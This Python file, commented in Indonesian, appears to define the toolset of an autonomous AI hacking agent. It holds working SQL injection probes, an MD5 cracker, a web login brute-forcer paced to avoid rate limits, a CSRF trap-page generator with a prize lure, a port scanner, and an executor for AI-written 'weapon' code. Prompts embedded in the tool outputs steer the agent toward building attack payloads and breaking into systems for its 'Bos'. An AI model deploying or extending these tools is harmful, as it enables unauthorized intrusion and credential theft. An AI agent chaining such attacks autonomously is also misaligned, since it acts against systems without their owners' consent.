import hashlib
import asyncio
import re
import json
from duckduckgo_search import DDGS
import aiosqlite
import aiohttp
import asyncio
from ddgs import DDGS
from memory import DB_NAME, cek_memori_hash
import numpy as np
from sklearn.metrics.pairwise import cosine_similarity
from sentence_transformers import SentenceTransformer
#

# Memuat "Otak Pembaca" SBERT (Ini akan terunduh otomatis saat pertama kali dijalankan)
print("⏳ Memuat model SBERT untuk Perpustakaan Ilmu...")
sbert_model = SentenceTransformer('all-MiniLM-L6-v2')
print("✅ Model SBERT siap!")

# ==========================================
# GUDANG SENJATA (FUNGSI DETERMINISTIK)
# ==========================================

async def tool_baca_panduan(pertanyaan: str) -> str:
    """
    Membaca dokumen_rahasia.txt dan mencari kalimat yang paling relevan dengan pertanyaan.
    """
    print(f"📚 [EKSEKUTOR] Mencari info di buku panduan tentang: '{pertanyaan}'...")
    
    try:
        # Membaca file txt
        with open("dokumen_rahasia.txt", "r", encoding="utf-8") as f:
            teks = f.read()
        
        # Memotong teks menjadi per baris (kita anggap 1 baris = 1 ilmu)
        baris_ilmu = [b.strip() for b in teks.split('\n') if b.strip()]
        
        if not baris_ilmu:
            return "❌ [INFO] Dokumen rahasia kosong."

        # MENGUBAH TEKS MENJADI VEKTOR MATEMATIKA
        vektor_dokumen = sbert_model.encode(baris_ilmu)
        vektor_pertanyaan = sbert_model.encode([pertanyaan])

        # Menghitung kemiripan (seberapa dekat jarak vektor pertanyaan dengan dokumen)
        skor_kemiripan = cosine_similarity(vektor_pertanyaan, vektor_dokumen)[0]
        
        # Mengambil ilmu dengan skor paling mirip
        indeks_terbaik = np.argmax(skor_kemiripan)
        skor_tertinggi = skor_kemiripan[indeks_terbaik]

        # Jika skornya di atas 0.3 (cukup relevan), kita berikan ke AI
        if skor_tertinggi > 0.3: 
            jawaban = baris_ilmu[indeks_terbaik]
            return f"📖 [PANDUAN DITEMUKAN] (Akurasi: {skor_tertinggi:.2f}):\n{jawaban}"
        else:
            return "❌ [INFO] Tidak ada panduan yang relevan untuk situasi ini."
            
    except FileNotFoundError:
        return "❌ [ERROR] File dokumen_rahasia.txt belum dibuat."

async def tool_scrape_web(target_url: str) -> str:
    """
    Mengambil isi sebuah website dan mengekstrak teksnya untuk mencari petunjuk.
    """
    print(f"🕸️ [EKSEKUTOR] Mengumpulkan intelijen dan membedah isi {target_url}...")
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(target_url, timeout=10) as response:
                html = await response.text()
                
                # 1. Hapus isi dari tag <script> dan <style> yang bikin pusing
                html_bersih = re.sub(r'<script.*?</script>', '', html, flags=re.DOTALL | re.IGNORECASE)
                html_bersih = re.sub(r'<style.*?</style>', '', html_bersih, flags=re.DOTALL | re.IGNORECASE)
                
                # 2. Hapus semua sisa tag HTML (<...>)
                teks_mentah = re.sub(r'<[^>]+>', ' ', html_bersih)
                
                # 3. Rapikan spasi berlebih
                teks_rapi = re.sub(r'\s+', ' ', teks_mentah).strip()
                
                # 4. Potong teks agar otak AI tidak pingsan (Batas 1000 karakter)
                if len(teks_rapi) > 1000:
                    teks_rapi = teks_rapi[:1000] + "\n... [TEKS DIPOTONG] ..."
                    
                return (
                    f"✅ [HASIL SCRAPING DARI {target_url}]:\n"
                    f"{teks_rapi}\n\n"
                    f"(Sistem -> AI: Analisis teks di atas! Cari kata-kata penting, petunjuk login, atau kelemahan yang bisa dieksploitasi.)"
                )
    except Exception as e:
        return f"❌ [ERROR] Gagal melakukan scraping. Detail: {e}"

async def tool_pencarian_internet(query: str) -> str:
    """
    Alat OSINT untuk melacak informasi di internet (Google/DuckDuckGo) secara real-time.
    """
    print(f"🌐 [OSINT] Mengerahkan radar ke internet untuk melacak: '{query}'...")
    
    try:
        # DDGS (DuckDuckGo Search) mencari secara anonim
        with DDGS() as ddgs:
            # Mengambil 3 hasil teratas agar AI tidak kepenuhan memori
            results = list(ddgs.text(query, max_results=3))
            
        if not results:
            return f"❌ [OSINT] Tidak ada jejak digital yang ditemukan untuk '{query}'."
            
        # Merangkum hasil pencarian ke dalam format yang mudah dibaca AI
        laporan = f"✅ [HASIL OSINT UNTUK: '{query}']\n\n"
        for i, res in enumerate(results):
            laporan += f"[{i+1}] {res['title']}\n"
            laporan += f"Ringkasan: {res['body']}\n"
            laporan += f"Sumber URL: {res['href']}\n"
            laporan += "-" * 30 + "\n"
            
        laporan += "\n(Sistem -> AI: Baca data intelijen di atas, ekstrak informasi yang relevan, dan laporkan dengan bahasa yang luwes kepada Bos!)"
        return laporan
        
    except Exception as e:
        return f"❌ [ERROR OSINT] Radar mengalami gangguan: {str(e)}"

async def tool_scan_sqli(target_url: str) -> str:
    """
    Pendeteksi celah SQL Injection. Mengirim payload ringan (tanda kutip)
    untuk melihat apakah database membocorkan pesan error SQL.
    Hanya untuk edukasi dan audit keamanan (bukan eksploitasi/pencurian data).
    """
    print(f"💉 [EKSEKUTOR] Memulai pemindaian celah SQLi pada {target_url}...")
    
    # Payload pancingan standar untuk memecahkan query database
    payloads = ["'", "\"", "' OR '1'='1", "') OR ('1'='1"]
    
    # Kata kunci error dari berbagai jenis database (MySQL, PostgreSQL, dll)
    sql_errors = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
        "pg_query()",
        "sqlite3.operationalerror"
    ]
    
    try:
        async with aiohttp.ClientSession() as session:
            for payload in payloads:
                # Menempelkan payload di akhir URL
                test_url = f"{target_url}{payload}"
                async with session.get(test_url, timeout=5) as response:
                    teks_balasan = await response.text()
                    teks_lower = teks_balasan.lower()
                    
                    # Mengecek apakah ada database error yang bocor ke HTML
                    for error in sql_errors:
                        if error in teks_lower:
                            return (
                                f"🚨 [CRITICAL ALERT] Celah SQL Injection Ditemukan!\n"
                                f"Target: {target_url}\n"
                                f"Payload yang memicu error: {payload}\n"
                                f"Pesan Error Database: '{error}'\n"
                                f"(Sistem -> AI: Laporkan kepada Bos bahwa sistem ini sangat rentan dan bisa dibobol penuh! Berikan saran mitigasi.)"
                            )
                            
                # Jeda agar tidak dianggap spam
                await asyncio.sleep(0.3)
                
            return f"✅ [AMAN] Tidak ditemukan indikasi celah SQL Injection dari payload dasar pada {target_url}."
            
    except Exception as e:
        return f"❌ [ERROR] Gagal memindai target: {str(e)}"

async def tool_inspeksi_html(target_url: str) -> str:
    """
    Mengambil raw HTML dari URL dan mengekstrak informasi form, action, method, dan input.
    """
    print(f"🔍 [EKSEKUTOR] Menginspeksi elemen form pada {target_url}...")
    
    try:
        async with aiohttp.ClientSession() as session:
            # Otomatis mengikuti redirect jika dilempar ke /login
            async with session.get(target_url, timeout=10) as response:
                html = await response.text()
                url_akhir = str(response.url) # Mendapatkan URL asli setelah redirect
                
                # Ekstrak semua form dari HTML
                forms = re.findall(r'<form.*?</form>', html, flags=re.DOTALL | re.IGNORECASE)
                
                if not forms:
                    return f"✅ [HASIL INSPEKSI]: Tidak ditemukan tag <form> di {url_akhir}."
                
                hasil = f"✅ [HASIL INSPEKSI DARI {url_akhir}]:\nDitemukan {len(forms)} form:\n"
                for i, form in enumerate(forms):
                    # Cari kemana form ini dikirim (action)
                    action = re.search(r'action=["\'](.*?)["\']', form, flags=re.IGNORECASE)
                    # Cari metodenya (POST/GET)
                    method = re.search(r'method=["\'](.*?)["\']', form, flags=re.IGNORECASE)
                    # Cari semua parameter input (name="")
                    inputs = re.findall(r'<input[^>]+name=["\'](.*?)["\']', form, flags=re.IGNORECASE)
                    
                    act_str = action.group(1) if action else "Tidak tertulis (biasanya dikirim ke URL ini sendiri)"
                    meth_str = method.group(1) if method else "GET"
                    
                    hasil += f"\n--- Form {i+1} ---\n"
                    hasil += f"Target URL (Action) : {act_str}\n"
                    hasil += f"Metode Request      : {meth_str.upper()}\n"
                    hasil += f"Parameter Input     : {', '.join(inputs) if inputs else 'Tidak ditemukan'}\n"
                
                return hasil + "\n\n(Sistem -> AI: Gunakan informasi ini untuk menyusun payload serangan!)"
    except Exception as e:
        return f"❌ [ERROR] Gagal melakukan inspeksi. Detail: {e}"
    
async def tool_crack_md5(target_hash: str, wordlist: list) -> str:
    """
    Fungsi untuk melakukan Brute Force pada hash MD5.
    Hanya akan melakukan komputasi jika hash belum ada di memori.
    """
    # 1. CEK MEMORI: AI mengingat pengalaman masa lalunya
    password_tersimpan = await cek_memori_hash(target_hash)
    if password_tersimpan:
        return f"✅ [MEMORI] Bos, saya ingat hash {target_hash} ini! Passwordnya adalah '{password_tersimpan}'. (Komputasi: 0 detik)"

    # 2. EKSEKUSI FISIK: Jika belum tahu, lakukan Brute Force
    print(f"⚙️ [EKSEKUTOR] Menjalankan brute force untuk hash: {target_hash}...")
    for word in wordlist:
        word_hash = hashlib.md5(word.encode()).hexdigest()
        
        # Jika password cocok
        if word_hash == target_hash:
            # 3. BELAJAR: Catat keberhasilan ke dalam memori
            async with aiosqlite.connect(DB_NAME) as db:
                await db.execute(
                    "INSERT OR REPLACE INTO hash_log (target_hash, cracked_password, status) VALUES (?, ?, 'SUCCESS')",
                    (target_hash, word)
                )
                await db.commit()
            return f"🔥 [BERHASIL] Hash {target_hash} jebol! Password: '{word}'"

    # 4. Jika gagal, catat juga agar AI tahu wordlist ini sudah tidak berguna
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute(
            "INSERT OR IGNORE INTO hash_log (target_hash, cracked_password, status) VALUES (?, 'UNKNOWN', 'FAILED')",
            (target_hash,)
        )
        await db.commit()
    
    return f"❌ [GAGAL] Brute force selesai. Tidak ada yang cocok di wordlist."

async def tool_eksekusi_python(kode_python: str) -> str:
    """
    Menyimpan string kode_python ke dalam file sementara dan menjalankannya di OS.
    """
    print("⚡ [EKSEKUTOR] AI Sedang membuat dan menjalankan senjata kodenya sendiri...")
    
    nama_file = "senjata_sementara.py"
    
    try:
        # 1. AI Menulis kode ke dalam file
        with open(nama_file, "w", encoding="utf-8") as f:
            f.write(kode_python)
            
        # 2. Kita suruh Linux menjalankan file tersebut
        proses = await asyncio.create_subprocess_exec(
            "python", nama_file,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        # 3. Kita beri batas waktu 15 detik agar komputer tidak hang 
        # jika AI membuat kode yang looping tanpa henti (infinite loop)
        stdout, stderr = await asyncio.wait_for(proses.communicate(), timeout=15.0)
        
        output = stdout.decode().strip()
        error = stderr.decode().strip()
        
        # 4. Kembalikan hasilnya ke Otak AI
        if proses.returncode == 0:
            return f"✅ [EKSEKUSI BERHASIL]:\n{output}"
        else:
            return f"❌ [EKSEKUSI GAGAL (SYNTAX ERROR)]:\n{error}\n(Sistem -> AI: Perbaiki kodemu dan coba lagi!)"
            
    except asyncio.TimeoutError:
        proses.kill()
        return "❌ [ERROR] Eksekusi dihentikan paksa karena terlalu lama (Timeout > 15 detik). Mungkin kodemu mengalami Infinite Loop."
    except Exception as e:
        return f"❌ [ERROR SISTEM FATAL]: {e}"

async def tool_analisis_keamanan(target_url: str) -> str:
    """
    Melakukan audit cepat pada URL target untuk mencari kelemahan dasar.
    """
    print(f"🕵️ [EKSEKUTOR] Melakukan audit keamanan (Vulnerability Scan) pada {target_url}...")
    laporan = []
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(target_url, timeout=5) as response:
                headers = response.headers
                html = await response.text()
                html_lower = html.lower()
                
                # 1. Cek Protokol (HTTP vs HTTPS)
                if target_url.startswith("http://"):
                    laporan.append("- ⚠️ URL menggunakan HTTP biasa (Rentan penyadapan/Sniffing).")
                
                # 2. Cek Kebocoran Identitas Server
                server_info = headers.get("Server", "")
                if server_info:
                    laporan.append(f"- ⚠️ Informasi Server Bocor: '{server_info}'. Hacker bisa mencari exploit khusus untuk versi ini.")
                
                # 3. Cek Keamanan Header (Clickjacking & XSS)
                if "X-Frame-Options" not in headers:
                    laporan.append("- ⚠️ Kelemahan Clickjacking: Header 'X-Frame-Options' tidak ditemukan.")
                if "Content-Security-Policy" not in headers:
                    laporan.append("- ⚠️ Rentan injeksi skrip (XSS): Header 'Content-Security-Policy' tidak ada.")
                
                # 4. Cek Form Login yang rapuh
                if "<form" in html_lower and "password" in html_lower:
                    if "csrf" not in html_lower:
                        laporan.append("- ⚠️ Ditemukan Form Login, tapi tidak ada token CSRF. Rentan terhadap serangan Brute Force dan manipulasi form.")
                        
    except Exception as e:
        return f"❌ [ERROR] Gagal melakukan audit. Detail: {e}"
        
    if laporan:
        hasil = "\n".join(laporan)
        return (
            f"🔍 [HASIL AUDIT KEAMANAN - {target_url}]:\n"
            f"{hasil}\n\n"
            f"(Sistem -> AI: Rangkum dan laporkan kelemahan ini kepada Bos dengan gaya analis yang profesional!)"
        )
    else:
        return f"✅ [HASIL AUDIT]: Tidak ditemukan kelemahan standar pada {target_url}. Web cukup aman."

async def tool_bruteforce_web(target_url: str, username: str, wordlist: list) -> str:
    """
    Versi Upgrade: Melakukan brute force dengan deteksi kegagalan yang lebih akurat
    untuk web modern (Node.js/Vercel).
    """
    print(f"⚙️ [EKSEKUTOR] Memulai serangan Web Brute Force v2.0 ke {target_url}...")
    print(f"👤 User: '{username}' | 📝 Wordlist: {len(wordlist)} kata")

    # Kita gunakan cookie jar agar sesi tetap terjaga jika diperlukan
    async with aiohttp.ClientSession() as session:
        for password in wordlist:
            payload = {
                "username": username,
                "password": password
            }
            
            try:
                # Kita set allow_redirects=True untuk melihat apakah kita dilempar ke /home
                async with session.post(target_url, data=payload, timeout=5) as response:
                    final_url = str(response.url)
                    teks_balasan = await response.text()
                    teks_balasan_lower = teks_balasan.lower()
                    
                    # --- LOGIKA DETEKSI KEGAGALAN (Negative Markers) ---
                    # Jika ada kata-kata ini, berarti 100% GAGAL
                    fail_markers = ["salah", "gagal", "invalid", "incorrect", "error", "tidak ditemukan"]
                    is_failed = any(marker in teks_balasan_lower for marker in fail_markers)
                    
                    # --- LOGIKA DETEKSI SUKSES (Positive Markers) ---
                    # 1. Jika URL berubah (misal dari /login ke /home)
                    # 2. Jika ada kata kunci keberhasilan
                    is_redirected = "/home" in final_url or "/dashboard" in final_url
                    success_markers = ["selamat", "logout", "profil", "welcome", "authenticated"]
                    is_success_text = any(marker in teks_balasan_lower for marker in success_markers)

                    if (is_redirected or is_success_text) and not is_failed:
                        return (
                            f"✅ [STATUS: SUKSES TOTAL]\n"
                            f"Sistem berhasil dibobol!\n"
                            f"Target: {final_url}\n"
                            f"Username: {username}\n"
                            f"Password Valid: {password}\n"
                            f"(Sistem -> AI: Berhenti mencari! Laporkan ke Bos bahwa misi sukses dan berikan password valid di atas!)"
                        )
                    
                    print(f"   [INFO] Mencoba '{password}'... Gagal (Respon: {response.status})")
                    
            except Exception as e:
                return f"❌ [ERROR] Masalah koneksi: {str(e)}"
            
            # Jeda agar tidak terkena rate limiting (blokir IP) oleh Vercel
            await asyncio.sleep(0.3)

    return f"❌ [GAGAL] Seluruh wordlist dicoba. Tidak ada yang cocok untuk user '{username}'."

async def tool_exploit_csrf(target_url: str, params: any) -> str:
    """
    Menghasilkan halaman HTML eksploitasi CSRF dengan proteksi tipe data.
    """
    print(f"☣️ [EKSEKUTOR] Merakit halaman jebakan CSRF untuk {target_url}...")
    
    # PERBAIKAN: Jika params dikirim AI sebagai string, ubah ke dictionary
    if isinstance(params, str):
        try:
            # Mengubah string menjadi dictionary
            params = json.loads(params.replace("'", '"')) 
        except:
            return "❌ [ERROR] AI mengirim parameter dalam format teks yang rusak."

    # Sekarang aman untuk menjalankan .items()
    form_inputs = ""
    try:
        for key, value in params.items():
            form_inputs += f'<input type="hidden" name="{key}" value="{value}">\n        '
    except AttributeError:
        return "❌ [ERROR] Parameter yang dikirim AI bukan format key-value yang benar."

    # ... (sisanya sama seperti sebelumnya) ...
    html_exploit = f"""
<!DOCTYPE html>
<html>
<body>
    <h1>Klaim Hadiah Anda!</h1>
    <form id="csrf-form" action="{target_url}" method="POST">
        {form_inputs}
        <button type="submit">Klik di Sini</button>
    </form>
</body>
</html>
"""
    with open("jebakan_csrf.html", "w") as f:
        f.write(html_exploit)
        
    return f"✅ [SUKSES] File 'jebakan_csrf.html' berhasil dibuat untuk target {target_url}."

async def cek_port(ip: str, port: int) -> int:
    """Fungsi internal pembantu untuk mengecek satu port"""
    try:
        # Kita beri batas waktu (timeout) sangat cepat: 0.5 detik
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port), timeout=0.5
        )
        writer.close()
        await writer.wait_closed()
        return port
    except Exception:
        return 0

async def tool_scan_port(target_ip: str) -> str:
    """
    Fungsi untuk memindai port yang terbuka pada sebuah IP.
    """
    print(f"📡 [EKSEKUTOR] Memindai celah port di target {target_ip}...")
    
    # Daftar port umum (termasuk port 5000 web Anda)
    port_umum = [21, 22, 80, 443, 3306, 5000, 8080]
    
    # Menjalankan pengecekan semua port secara bersamaan (Concurrent)
    tasks = [cek_port(target_ip, p) for p in port_umum]
    results = await asyncio.gather(*tasks)
    
    port_terbuka = [p for p in results if p != 0]
    
    if port_terbuka:
        return f"🔍 [INFO PENTING] Port yang terbuka di {target_ip} adalah: {port_terbuka}. (Catatan untuk AI: Jika ada port 80, 5000, atau 8080, itu adalah server web, pertimbangkan untuk menggunakan tool_bruteforce_web)."
    else:
        return f"❌ [GAGAL] Tidak ada port umum yang terbuka di {target_ip}."